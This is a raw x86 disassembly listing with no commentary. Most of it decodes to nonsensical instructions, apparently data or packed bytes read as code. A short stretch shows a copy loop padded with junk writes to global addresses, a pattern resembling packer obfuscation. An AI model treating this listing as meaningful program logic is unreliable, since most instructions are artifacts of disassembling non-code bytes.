  413ab2:	xlat   BYTE PTR ds:[ebx]
  413ab3:	cmp    eax,DWORD PTR [ecx-0x68bdeb0c]
  413ab9:	neg    BYTE PTR [edx+0x4456927d]
  413abf:	out    0x84,al
  413ac1:	in     eax,0xfb
  413ac3:	jle    0x413ac1
  413ac5:	mov    ah,0xc5
  413ac7:	lds    esi,FWORD PTR [edi-0x59e82940]
  413acd:	enter  0xbbfc,0x63
  413ad1:	pop    ebx
  413ad2:	sti    
  413ad3:	ss (bad) 
  413ad5:	jp     0x413ac7
  413ad7:	ret    0x9431
  413ada:	scas   al,BYTE PTR es:[edi]
  413adb:	out    0xa,al
  413add:	jmp    0xc5901f20
  413ae2:	pop    es
  413ae3:	mov    ecx,DWORD PTR [eax]
  413ae5:	pop    eax
  413ae6:	in     al,0x2b
  413ae8:	dec    ebx
  413ae9:	dec    esi
  413aea:	rcl    DWORD PTR [ebx],0x55
  413aed:	push   es
  413aee:	jns    0x413b6c
  413af0:	mov    BYTE PTR [edi+ebx*1-0x5cbde861],cl
  413af7:	(bad)  
  413af9:	pushf  
  413afa:	les    esi,FWORD PTR [eax]
  413afc:	inc    esp
  413afd:	(bad)
  413b00:	aam    0x6f
  413b02:	outs   dx,DWORD PTR ds:[esi]
  413b03:	jnp    0x413b59
  413b05:	adc    eax,0x277aba00
  413b0a:	pop    es
  413b0b:	mov    eax,ebp
  413b0d:	jg     0x413ae4
  413b0f:	jb     0x413b78
  413b11:	dec    eax
  413b12:	pop    ebx
  413b13:	dec    ebx
  413b14:	int3   
  413b15:	inc    edx
  413b16:	in     al,dx
  413b17:	test   BYTE PTR [esi+0xa],0xd8
  413b1b:	cli    
  413b1c:	or     cl,bl
  413b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b1f:	aas    
  413b20:	mov    ebx,0xfe56e007
  413b25:	dec    edx
  413b26:	jmp    0x5340495e
  413b2b:	xchg   esp,eax
  413b2c:	jbe    0x413b13
  413b2e:	xchg   edi,eax
  413b2f:	xchg   esi,eax
  413b30:	rol    dl,cl
  413b32:	sbb    DWORD PTR [edx+0x2e07b7f6],0x76
  413b39:	sub    eax,0xa235a80a
  413b3e:	push   0x2
  413b40:	std    
  413b41:	imul   eax,DWORD PTR [ebx],0xffffffe8
  413b44:	add    DWORD PTR [ecx],ecx
  413b46:	js     0x413b3b
  413b48:	and    ecx,DWORD PTR [eax+0x168bf7fa]
  413b4e:	dec    eax
  413b4f:	nop
  413b50:	jbe    0x413b4a
  413b52:	add    eax,0x55c63c2b
  413b57:	and    ch,BYTE PTR ds:0xefc520cf
  413b5d:	pop    ebx
  413b5e:	out    0x93,al
  413b60:	xchg   ebp,eax
  413b61:	jb     0x413bb3
  413b63:	(bad)  
  413b64:	sti    
  413b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b66:	jbe    0x413b5a
  413b68:	adc    eax,0xf8e45783
  413b6d:	aam    0xf
  413b6f:	or     BYTE PTR ss:[ebp-0x4748e082],al
  413b76:	outs   dx,DWORD PTR ds:[esi]
  413b77:	mov    ds:0xbc3437c2,al
  413b7c:	adc    al,BYTE PTR [ecx]
  413b7e:	(bad)  
  413b7f:	out    0x80,eax
  413b81:	ins    BYTE PTR es:[edi],dx
  413b82:	mov    edx,0x4f48f752
  413b87:	sub    BYTE PTR [edi+0x6a2ca02b],ah
  413b8d:	cmp    BYTE PTR [ebx],0xbf
  413b90:	fs cld 
  413b92:	mov    ds:0xde6c725e,al
  413b97:	mov    dh,0x98
  413b99:	sub    eax,0x630bb9be
  413b9e:	out    0x93,al
  413ba0:	lock shr DWORD PTR [edx-0x7c],1
  413ba4:	push   ds
  413ba5:	pop    eax
  413ba6:	xor    bl,cl
  413ba8:	stos   DWORD PTR es:[edi],eax
  413ba9:	es dec edx
  413bab:	or     al,0x56
  413bad:	(bad)  
  413bae:	inc    DWORD PTR [edx]
  413bb0:	inc    ebp
  413bb1:	sbb    bh,cl
  413bb3:	or     eax,0xed333977
  413bb8:	pop    esp
  413bb9:	inc    esi
  413bba:	fs enter 0x521b,0x5a
  413bbf:	xchg   esp,eax
  413bc0:	out    dx,al
  413bc1:	pushf  
  413bc2:	mov    WORD PTR [esi+eiz*8],es
  413bc5:	xor    al,0x64
  413bc7:	sub    ecx,edx
  413bc9:	retf   0xaf82
  413bcc:	scas   al,BYTE PTR es:[edi]
  413bcd:	push   0xffffffef
  413bcf:	inc    ebx
  413bd0:	jle    0x413bde
  413bd2:	add    eax,0x94d96c7
  413bd7:	push   ecx
  413bd8:	das    
  413bd9:	jl     0x413bb2
  413bdb:	mov    eax,0xfaf2a474
  413be0:	push   ebx
  413be1:	test   al,0xd7
  413be3:	inc    esp
  413be4:	mov    ah,0xbe
  413be6:	test   BYTE PTR ds:0x31079a55,cl
  413bec:	add    DWORD PTR [esi],0x9b53c67a
  413bf2:	(bad)  
  413bf3:	pop    ss
  413bf4:	pop    ds
  413bf5:	push   ss
  413bf6:	sub    al,0x36
  413bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bf9:	push   esi
  413bfa:	pop    edi
  413bfb:	or     BYTE PTR [ecx],dh
  413bfd:	bound  ebp,QWORD PTR [esi+edi*2+0x30c31855]
  413c04:	(bad)  
  413c05:	mov    dh,0x4e
  413c07:	retf   
  413c08:	sbb    edi,0xa5d2bf55
  413c0e:	imul   ebp,DWORD PTR [ecx],0xfffffff5
  413c11:	and    BYTE PTR [ecx+0x2c3270e9],bh
  413c17:	cld    
  413c18:	leave  
  413c19:	scas   eax,DWORD PTR es:[edi]
  413c1a:	shl    DWORD PTR [esi+0x70e04e7f],0x3d
  413c21:	in     eax,0x98
  413c23:	push   edx
  413c24:	push   edx
  413c25:	lods   eax,DWORD PTR ds:[esi]
  413c26:	(bad)  
  413c27:	ds ja  0x413c6f
  413c2a:	mov    ah,0x39
  413c2c:	pusha  
  413c2d:	jae    0x413c98
  413c2f:	mov    ebp,0xa8782999
  413c34:	xchg   ecx,eax
  413c35:	xchg   BYTE PTR [ebp-0x28ebe1d0],dl
  413c3b:	add    eax,DWORD PTR [ecx+0x4fb24c8e]
  413c41:	mov    eax,ds:0x5c44f757
  413c46:	ja     0x413bf4
  413c48:	add    ecx,ebp
  413c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c4b:	stos   BYTE PTR es:[edi],al
  413c4c:	fsubr  QWORD PTR [eax-0x1]
  413c4f:	jp     0x413bfe
  413c51:	aaa    
  413c52:	cmp    BYTE PTR [ebx-0x23],0x4
  413c56:	cmp    al,0xe7
  413c58:	jp     0x413bf7
  413c5a:	test   eax,0xf2c22f16
  413c5f:	icebp  
  413c60:	and    ch,ch
  413c62:	je     0x413c02
  413c64:	dec    ecx
  413c65:	ror    DWORD PTR [eax-0x55563207],1
  413c6b:	in     al,dx
  413c6c:	int3   
  413c6d:	dec    ecx
  413c6e:	pop    eax
  413c6f:	std    
  413c70:	xchg   bh,ch
  413c72:	inc    ecx
  413c73:	fst    QWORD PTR [esi+0x7d4ce28e]
  413c79:	xchg   esi,eax
  413c7a:	sub    esp,DWORD PTR [eax+0x49]
  413c7d:	rcl    BYTE PTR [ecx+0x5],cl
  413c80:	out    0xfa,al
  413c82:	mov    esi,0x34fd07
  413c87:	imul   esp,esi,0xdde73e8e
  413c8d:	shl    DWORD PTR [edi],1
  413c8f:	fisttp DWORD PTR [esp+esi*4+0x46]
  413c93:	fst    st(3)
  413c95:	test   BYTE PTR [edi+0x27c2f37a],bh
  413c9b:	jg     0x413d03
  413c9d:	add    eax,0xa62eac13
  413ca2:	call   FWORD PTR [edi]
  413ca4:	lods   al,BYTE PTR ds:[esi]
  413ca5:	fcmove st,st(4)
  413ca7:	outs   dx,BYTE PTR ds:[esi]
  413ca8:	jmp    0x5813:0xe29fb2b8
  413caf:	xor    ah,BYTE PTR [esi+eax*4+0x3244ea38]
  413cb6:	mov    BYTE PTR [ebp-0x6c915d54],0x8a
  413cbd:	rcr    BYTE PTR [ebx+0x546d73da],1
  413cc3:	mul    ah
  413cc5:	mov    al,ds:0x6458a0ea
  413cca:	ss mov ebp,0x978d2cb9
  413cd0:	inc    esp
  413cd1:	mov    eax,DWORD PTR [bx+si]
  413cd4:	mov    WORD PTR [esi-0xa3922c8],gs
  413cda:	imul   ecx,DWORD PTR [esi],0x57
  413cdd:	test   DWORD PTR ds:0xf8c566bd,ebp
  413ce3:	inc    edi
  413ce4:	cmc    
  413ce5:	into   
  413ce6:	stc    
  413ce7:	sbb    BYTE PTR [ebp+0x73],dh
  413cea:	sbb    BYTE PTR [edx+eiz*1],ch
  413ced:	xor    al,0x35
  413cef:	mov    ds:0x2b292f2d,al
  413cf4:	xor    al,0xe5
  413cf6:	mov    ds:0xc7b35a21,al
  413cfb:	outs   dx,DWORD PTR ds:[esi]
  413cfc:	call   0xee30:0x24188da2
  413d03:	and    ecx,0x9931233
  413d09:	outs   dx,BYTE PTR ds:[esi]
  413d0a:	retf   
  413d0b:	fsubr  QWORD PTR [edx+0x45]
  413d0e:	adc    edi,DWORD PTR [edi+0x22]
  413d11:	push   eax
  413d12:	aam    0xd0
  413d14:	sub    eax,esi
  413d16:	sahf   
  413d17:	mov    ebp,0x2715f382
  413d1c:	loop   0x413d47
  413d1e:	jmp    FWORD PTR [eax-0x48f2cf92]
  413d24:	cmp    DWORD PTR [ecx],ecx
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	in     eax,0xdb
  413d29:	push   0x19945437
  413d2e:	sub    ch,BYTE PTR [ecx-0x594a9a6b]
  413d34:	cwde   
  413d35:	jns    0x413cd5
  413d37:	test   DWORD PTR [edi-0x57],ebp
  413d3a:	xor    al,0xf0
  413d3c:	jge    0x413d75
  413d3e:	mov    ah,0x7e
  413d40:	ret    
  413d41:	xorps  xmm7,XMMWORD PTR [ecx-0x67]
  413d45:	loop   0x413cd5
  413d47:	dec    ebx
  413d48:	icebp  
  413d49:	arpl   WORD PTR [esi+0x507bdd10],bp
  413d4f:	sbb    DWORD PTR [esi+eiz*8+0x61deeef3],edi
  413d56:	or     esp,ecx
  413d58:	mov    esi,0x1a08ca4b
  413d5d:	or     ebx,DWORD PTR ds:0x41f7a963
  413d63:	sub    DWORD PTR [edi+0x7a3b66eb],ecx
  413d69:	adc    DWORD PTR [edx+eiz*4-0x78b94714],esi
  413d70:	mov    al,0xa
  413d72:	jae    0x413d89
  413d74:	in     eax,0xc1
  413d76:	push   es
  413d77:	add    al,0xf5
  413d79:	jo     0x413d1e
  413d7b:	imul   ecx,edx,0xffffffeb
  413d7e:	(bad)  
  413d7f:	leave  
  413d80:	fdiv   DWORD PTR [ebx+0x59]
  413d83:	inc    esi
  413d84:	push   ss
  413d85:	mov    dh,0x93
  413d87:	arpl   dx,ax
  413d89:	xor    eax,0x9809d7ea
  413d8e:	sub    DWORD PTR [edi-0x1],edx
  413d91:	add    cl,BYTE PTR [ecx-0x53269dbc]
  413d97:	xlat   BYTE PTR ds:[ebx]
  413d98:	push   esi
  413d99:	call   0x49cc:0xbb9bd3e3
  413da0:	call   0x5031:0x8ff7b2a6
  413da7:	aam    0xe6
  413da9:	aam    0xf8
  413dab:	cmp    eax,DWORD PTR [edx]
  413dad:	or     DWORD PTR [eax],0xffffff83
  413db0:	push   cs
  413db1:	mov    dl,0xf1
  413db3:	adc    dl,BYTE PTR [esp+edi*2]
  413db6:	fist   DWORD PTR [ecx]
  413db8:	je     0x413d7c
  413dba:	jno    0x413dda
  413dbc:	or     esp,DWORD PTR [eax]
  413dbe:	ja     0x413e14
  413dc0:	enter  0x8935,0xd3
  413dc4:	aaa    
  413dc5:	nop
  413dc6:	(bad)  
  413dc8:	inc    ecx
  413dc9:	sbb    DWORD PTR [eax+0x29],0x3a
  413dcd:	adc    al,0x62
  413dcf:	add    eax,0x38c98a9a
  413dd4:	jge    0x413de1
  413dd6:	into   
  413dd7:	scas   al,BYTE PTR es:[edi]
  413dd8:	jmp    0x413e23
  413dda:	mov    ecx,0xd8ab9010
  413ddf:	mov    esi,0xf839bffb
  413de4:	pusha  
  413de5:	dec    edi
  413de6:	aad    0x59
  413de8:	ja     0x413d8c
  413dea:	jp     0x413dc1
  413dec:	(bad)  
  413ded:	test   DWORD PTR [eax],0x4cd15382
  413df3:	lods   al,BYTE PTR ds:[esi]
  413df4:	jg     0x413dc7
  413df6:	call   DWORD PTR [ecx+0x393b5519]
  413dfc:	pop    ss
  413dfd:	push   ss
  413dfe:	out    dx,al
  413dff:	div    bl
  413e01:	jmp    0x2a8f4174
  413e06:	lds    ecx,FWORD PTR [eax]
  413e08:	rol    DWORD PTR [ebp-0x59],0xdb
  413e0c:	inc    edx
  413e0d:	sub    DWORD PTR [esi],ecx
  413e0f:	adc    eax,0xe5614a93
  413e14:	in     eax,dx
  413e15:	cmp    eax,0x47857c62
  413e1a:	fstp   DWORD PTR [ebp-0x4b]
  413e1d:	addr16 dec edx
  413e1f:	in     eax,dx
  413e20:	push   edx
  413e21:	into   
  413e22:	jle    0x413de8
  413e24:	pop    ss
  413e25:	cmp    al,0x6e
  413e27:	push   ebp
  413e28:	bound  esi,QWORD PTR [eax+0x27]
  413e2b:	out    0x35,eax
  413e2d:	outs   dx,DWORD PTR ds:[esi]
  413e2e:	jp     0x413dd1
  413e30:	cmp    al,0x9b
  413e32:	mov    ebp,0x10c1466f
  413e37:	cmp    esi,esp
  413e39:	cmp    BYTE PTR [edi],bh
  413e3b:	cmc    
  413e3c:	addr16 sub si,dx
  413e40:	xor    BYTE PTR [ebp-0x67],0x51
  413e44:	xor    al,0xd2
  413e46:	mov    bx,si
  413e49:	outs   dx,DWORD PTR ds:[esi]
  413e4a:	push   esp
  413e4b:	jg     0x413e1f
  413e4d:	ins    BYTE PTR es:[edi],dx
  413e4e:	mov    bl,0xc4
  413e50:	sbb    al,0x5b
  413e52:	lea    edi,[eax+0x16]
  413e55:	mov    ch,0xb9
  413e57:	out    dx,al
  413e58:	or     eax,0x6e026a18
  413e5d:	ret    0x3ba1
  413e60:	retf   
  413e61:	mov    bh,0x8d
  413e63:	mov    al,0x90
  413e65:	pop    ss
  413e66:	xor    BYTE PTR [ebx+0x53cbb32a],ah
  413e6c:	mov    dh,0xe5
  413e6e:	inc    ebx
  413e6f:	out    dx,al
  413e70:	dec    ebp
  413e71:	xchg   edi,eax
  413e72:	aam    0x9c
  413e74:	jno    0x413e61
  413e76:	push   ecx
  413e77:	adc    BYTE PTR [edx-0x22],dh
  413e7a:	mov    ebx,0x9f221e5
  413e7f:	and    al,0x66
  413e81:	ja     0x413e82
  413e83:	aaa    
  413e84:	pop    esp
  413e85:	inc    eax
  413e86:	cmp    eax,0x43f52211
  413e8b:	icebp  
  413e8c:	and    al,0x49
  413e8e:	dec    ebx
  413e8f:	lock mov esi,0x1c80fe38
  413e95:	mov    ecx,DWORD PTR [edi+0x5a]
  413e98:	mov    ebp,0x5ed1129d
  413e9d:	nop
  413e9e:	dec    edx
  413e9f:	push   es
  413ea0:	jmp    0x413ee5
  413ea2:	fmul   DWORD PTR [eax]
  413ea4:	mov    al,0xce
  413ea6:	push   cs
  413ea7:	sti    
  413ea8:	xor    eax,0x21f7c0ad
  413ead:	cmp    cl,BYTE PTR [edx]
  413eaf:	sub    dl,BYTE PTR [edx]
  413eb1:	pop    ds
  413eb2:	div    ecx
  413eb4:	shl    DWORD PTR [ebp-0xb],1
  413eb7:	in     eax,dx
  413eb8:	xchg   ebp,eax
  413eb9:	mul    dh
  413ebb:	sbb    esi,DWORD PTR [ebp+0x79]
  413ebe:	fist   WORD PTR [edx]
  413ec0:	push   eax
  413ec1:	outs   dx,BYTE PTR cs:[esi]
  413ec3:	rcr    ch,0x91
  413ec6:	inc    esp
  413ec7:	jle    0x413e7e
  413ec9:	imul   edi,DWORD PTR [edx-0x595081b9],0x4d6e1040
  413ed3:	(bad)  
  413ed4:	neg    BYTE PTR [esi+0x5f]
  413ed7:	icebp  
  413ed8:	mov    WORD PTR [ebx],gs
  413eda:	mov    ecx,0xe1853a8a
  413edf:	pop    ebx
  413ee0:	mov    bl,ch
  413ee2:	jmp    0x89a:0x14845c51
  413ee9:	addr16 or al,0x38
  413eec:	cmp    BYTE PTR [esi-0x4f],dl
  413eef:	test   DWORD PTR [esi],ebx
  413ef1:	jle    0x413f62
  413ef3:	mov    dh,0x88
  413ef5:	ins    DWORD PTR es:[edi],dx
  413ef6:	jns    0x413f68
  413ef8:	into   
  413ef9:	push   ss
  413efa:	(bad)  
  413efb:	mov    dh,0xa8
  413efd:	enter  0xdf6d,0x22
  413f01:	xchg   esi,eax
  413f02:	cmp    DWORD PTR [edi-0x4f],ecx
  413f05:	add    al,0xcc
  413f07:	or     al,0xfc
  413f09:	dec    esp
  413f0a:	loop   0x413f2e
  413f0c:	inc    eax
  413f0d:	and    BYTE PTR [ebx],ch
  413f0f:	and    eax,0xa65098fc
  413f14:	jne    0x413ec8
  413f16:	add    eax,esi
  413f18:	scas   eax,DWORD PTR es:[edi]
  413f19:	dec    edi
  413f1a:	dec    ecx
  413f1b:	(bad)  
  413f1c:	mov    cl,0x44
  413f1e:	pop    esp
  413f1f:	mov    DWORD PTR [ecx+0x2f32421c],edi
  413f25:	xchg   ebp,eax
  413f26:	ds pop edi
  413f28:	(bad)  
  413f29:	rcl    BYTE PTR [esi-0x5feb9da6],cl
  413f2f:	cmp    DWORD PTR [ecx],edx
  413f31:	sar    BYTE PTR [edi-0x33a2098],0x1a
  413f38:	ret    0x8259
  413f3b:	(bad)  
  413f3c:	shl    BYTE PTR [ebp+0x44763210],1
  413f42:	dec    eax
  413f43:	mov    edi,0xbbb55288
  413f48:	mov    ebp,0xe3f320f9
  413f4d:	mov    ecx,0xd009a2cc
  413f52:	aad    0xc6
  413f54:	ret    
  413f55:	and    cl,BYTE PTR [edi]
  413f57:	or     edi,DWORD PTR [ebx-0x21e76b5b]
  413f5d:	fiadd  DWORD PTR [esi]
  413f5f:	pop    ds
  413f60:	xor    BYTE PTR [ebp-0x30],dh
  413f63:	pop    esi
  413f64:	pop    eax
  413f65:	call   0x25c5:0x9b652298
  413f6c:	daa    
  413f6d:	mov    bl,0xbf
  413f6f:	mov    bl,0xe8
  413f71:	iret   
  413f72:	xchg   esi,eax
  413f73:	mov    eax,ds:0x81662040
  413f78:	mov    dl,0x12
  413f7a:	or     BYTE PTR [edx+0x73],cl
  413f7d:	sbb    cl,BYTE PTR [ecx]
  413f7f:	out    0xe6,al
  413f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f82:	jge    0x413fde
  413f84:	xor    eax,0x5f793138
  413f89:	xor    DWORD PTR [ecx-0x7d],esp
  413f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f8d:	fs rol ch,0x87
  413f91:	pop    ss
  413f92:	adc    esi,ebp
  413f94:	fist   WORD PTR [ecx]
  413f96:	div    edi
  413f98:	lahf   
  413f99:	ficom  DWORD PTR [edi]
  413f9b:	jb     0x413f68
  413f9d:	jl     0x413fe0
  413f9f:	pop    ss
  413fa0:	push   0xffffffa7
  413fa2:	in     al,dx
  413fa3:	sub    BYTE PTR [edx+0x749012b7],dl
  413fa9:	add    DWORD PTR [edi+0x54],edi
  413fac:	das    
  413fad:	retf   
  413fae:	jmp    0x3e71c9e8
  413fb3:	pop    edx
  413fb4:	ds xchg edi,eax
  413fb6:	inc    ecx
  413fb7:	test   ebx,eax
  413fb9:	jl     0x413fea
  413fbb:	lods   al,BYTE PTR ds:[esi]
  413fbc:	retf   
  413fbd:	pop    edx
  413fbe:	sbb    ebp,DWORD PTR [ebx+eiz*1-0xc]
  413fc2:	inc    eax
  413fc3:	dec    esp
  413fc4:	and    eax,0xba03642d
  413fc9:	ret    0x138f
  413fcc:	loopne 0x41401b
  413fce:	popf   
  413fcf:	jnp    0x41403d
  413fd1:	jno    0x413f8c
  413fd3:	push   ebp
  413fd4:	xor    eax,0xcdd5feaa
  413fd9:	sbb    BYTE PTR [ebx],bl
  413fdb:	dec    edi
  413fdc:	fstp   TBYTE PTR gs:[ecx+0x6928de1a]
  413fe3:	loope  0x413f88
  413fe5:	addr16 or eax,0x72583a70
  413feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fec:	(bad)  
  413fed:	retf   
  413fee:	mov    ?,WORD PTR [ebp+ecx*8-0x7a]
  413ff2:	adc    bh,al
  413ff4:	mov    cl,0xab
  413ff6:	lds    ebx,FWORD PTR [eax+0x2f401af]
  413ffc:	aaa    
  413ffd:	mov    ds:0x604ca292,eax
  414002:	mov    dh,0x41
  414004:	(bad)  
  414006:	sbb    bl,0x59
  414009:	jno    0x413fdc
  41400b:	inc    esp
  41400c:	dec    ebp
  41400d:	mov    ebp,0xf45b7977
  414012:	es (bad) 
  414014:	pop    ecx
  414015:	xor    edi,ecx
  414017:	inc    edx
  414018:	mov    dl,0xf
  41401a:	mov    al,ds:0xc277e62e
  41401f:	pop    ebx
  414020:	ret    0x30d7
  414023:	cld    
  414024:	mov    ecx,ss
  414026:	inc    ebx
  414027:	fbld   TBYTE PTR [ebx-0x59c3d90e]
  41402d:	loop   0x414052
  41402f:	jbe    0x4140a2
  414031:	daa    
  414032:	ret    
  414033:	add    DWORD PTR [esi-0x19],ecx
  414036:	aaa    
  414037:	scas   eax,DWORD PTR es:[edi]
  414038:	xor    eax,0xc4797049
  41403d:	popf   
  41403e:	shl    DWORD PTR [edi+ebx*4],cl
  414041:	dec    edi
  414042:	stc    
  414043:	xchg   ecx,eax
  414044:	std    
  414045:	lods   eax,DWORD PTR ds:[esi]
  414046:	and    al,0x95
  414048:	mov    ch,0x63
  41404a:	fwait
  41404b:	adc    edx,DWORD PTR [esi+0x4d]
  41404e:	adc    bh,al
  414050:	leave  
  414051:	push   esp
  414052:	sbb    al,0x48
  414054:	and    al,0x20
  414056:	cmp    eax,0x203d824b
  41405b:	xor    esi,eax
  41405d:	iret   
  41405e:	inc    eax
  41405f:	ins    BYTE PTR es:[edi],dx
  414060:	mov    ah,al
  414062:	aas    
  414063:	stos   BYTE PTR es:[edi],al
  414064:	ins    DWORD PTR es:[edi],dx
  414065:	xor    dl,BYTE PTR [eax+0x752b8533]
  41406b:	xchg   ecx,eax
  41406c:	mov    edi,0xd01ac38a
  414071:	add    eax,0xaf9e968a
  414076:	call   0x55ffc7ac
  41407b:	add    eax,0xbec0e1d2
  414080:	aam    0xfd
  414082:	push   0xe0da7bc6
  414087:	or     bh,BYTE PTR [eax-0x7a6194b7]
  41408d:	jmp    0xcdd77d2f
  414092:	push   edi
  414093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414094:	inc    eax
  414095:	jo     0x4140e5
  414097:	lahf   
  414098:	add    DWORD PTR [edx+0x75],esp
  41409b:	call   0xae9660de
  4140a0:	lods   eax,DWORD PTR ds:[esi]
  4140a1:	pushf  
  4140a2:	sbb    edi,edi
  4140a4:	push   esp
  4140a5:	sbb    esi,DWORD PTR [ebx]
  4140a7:	pop    eax
  4140a8:	pop    eax
  4140a9:	dec    edi
  4140aa:	jns    0x414086
  4140ac:	addr16 out dx,al
  4140ae:	xor    bh,BYTE PTR [esi]
  4140b0:	ja     0x414131
  4140b2:	inc    ebx
  4140b3:	jns    0x41403f
  4140b5:	mov    edx,?
  4140b7:	ins    DWORD PTR es:[edi],dx
  4140b8:	sbb    cl,BYTE PTR [edx-0x42]
  4140bb:	addr16 icebp 
  4140bd:	pop    es
  4140be:	mov    ecx,0x4d3b5f36
  4140c3:	(bad)  
  4140c4:	idiv   BYTE PTR [eax]
  4140c6:	dec    ebx
  4140c7:	cld    
  4140c8:	sbb    DWORD PTR [edi+0x6dbefb3a],edx
  4140ce:	cmp    al,0x1c
  4140d0:	pop    es
  4140d1:	mov    eax,ds:0xafb85601
  4140d6:	or     BYTE PTR [ecx+0x7],dl
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1-0x1d95c7a7],dl
  41419c:	xchg   esp,eax
  41419d:	loope  0x4141fb
  41419f:	xchg   ebp,eax
  4141a0:	push   0x60e78382
  4141a5:	add    DWORD PTR [ebx-0x7cc4bd0f],0x72
  4141ac:	dec    esi
  4141ad:	mov    ebx,0xa99e9e01
  4141b2:	pavgb  mm2,QWORD PTR [edx]
  4141b5:	cs pop edx
  4141b7:	out    dx,al
  4141b8:	mov    ss,WORD PTR [ecx-0x2d]
  4141bb:	call   0xd1c:0x4aa07469
  4141c2:	pop    edi
  4141c3:	jbe    0x4141f8
  4141c5:	adc    eax,0xc93955d2
  4141ca:	push   es
  4141cb:	pop    es
  4141cc:	mov    DWORD PTR [edi-0x4ddfdd3c],esp
  4141d2:	repnz inc esp
  4141d4:	fisttp WORD PTR [ebx+0x30]
  4141d7:	or     al,0x7a
  4141d9:	sub    ch,al
  4141db:	xchg   ebp,eax
  4141dc:	jl     0x41418a
  4141de:	adc    cl,BYTE PTR [ebp-0x7]
  4141e1:	jnp    0x414178
  4141e3:	jne    0x4141e0
  4141e5:	leave  
  4141e6:	mov    bh,0x28
  4141e8:	fnstsw WORD PTR [esi-0x8466895]
  4141ee:	xlat   BYTE PTR es:[ebx]
  4141f0:	(bad)  
  4141f1:	jle    0x4141f2
  4141f3:	ins    DWORD PTR es:[edi],dx
  4141f4:	xor    BYTE PTR [esi+0x29],0x86
  4141f8:	sbb    al,0x79
  4141fa:	out    dx,al
  4141fb:	adc    ch,0xbb
  4141fe:	ror    BYTE PTR [ebx-0x59],cl
  414201:	daa    
  414202:	adc    ecx,DWORD PTR [eax+0x5a151ec9]
  414208:	adc    DWORD PTR [edx+esi*4-0x3f44f087],ebp
  41420f:	inc    ebp
  414210:	mov    ch,0xaf
  414212:	ret    
  414213:	and    dl,BYTE PTR [edi+edx*1]
  414216:	sbb    al,0x46
  414218:	or     BYTE PTR [edx],bl
  41421a:	in     al,0x92
  41421c:	jmp    0x41421b
  41421e:	sbb    al,0x48
  414220:	push   edi
  414221:	ret    0x1168
  414224:	sub    DWORD PTR [edi],ebx
  414226:	adc    BYTE PTR [ebx],dh
  414228:	icebp  
  414229:	push   0xffffffdc
  41422b:	je     0x414245
  41422d:	cld    
  41422e:	mov    edx,0xe863ed59
  414233:	xlat   BYTE PTR ds:[ebx]
  414234:	scas   al,BYTE PTR es:[edi]
  414235:	(bad)  
  414236:	lock imul esi,DWORD PTR [ebx+0x336e7646],0x53
  41423e:	jne    0x41428f
  414240:	scas   al,BYTE PTR es:[edi]
  414241:	xchg   ebx,eax
  414242:	or     DWORD PTR [edx+0xaee17d3],0x7d74999e
  41424c:	mov    WORD PTR [ebx-0x5ed49b6c],es
  414252:	pusha  
  414253:	dec    ebp
  414254:	mov    dh,0xe
  414256:	jbe    0x4141da
  414258:	jo     0x414209
  41425a:	inc    edi
  41425b:	out    dx,eax
  41425c:	and    bh,BYTE PTR [eax-0x72adca27]
  414262:	xor    BYTE PTR [edi-0x59],dl
  414265:	adc    DWORD PTR [edx+0x56],esp
  414268:	mov    cl,0x2f
  41426a:	sbb    BYTE PTR [ebx],dl
  41426c:	pop    ecx
  41426d:	int    0x7d
  41426f:	and    al,BYTE PTR [ebp+ebx*1+0x54d78367]
  414276:	push   cs
  414277:	daa    
  414278:	lods   eax,DWORD PTR ds:[esi]
  414279:	pop    ds
  41427a:	fimul  WORD PTR [edx-0x723cd949]
  414280:	dec    esp
  414281:	mov    ebx,0x280dd879
  414286:	pushf  
  414287:	mov    ds,WORD PTR [ebx+0x49]
  41428a:	jle    0x4142b8
  41428c:	(bad)  
  41428d:	hlt    
  41428e:	aam    0x7d
  414290:	or     al,BYTE PTR [esi+0x7cf72b87]
  414296:	lds    ecx,FWORD PTR [ebp-0x6d3fe4c7]
  41429c:	in     al,0x3c
  41429e:	cmp    DWORD PTR [ecx-0x8],eax
  4142a1:	or     DWORD PTR [eax],edi
  4142a3:	hlt    
  4142a4:	sar    esp,1
  4142a6:	add    BYTE PTR [ebx+0x64],bl
  4142a9:	retf   0x7c8e
  4142ac:	add    ebx,esi
  4142ae:	inc    esi
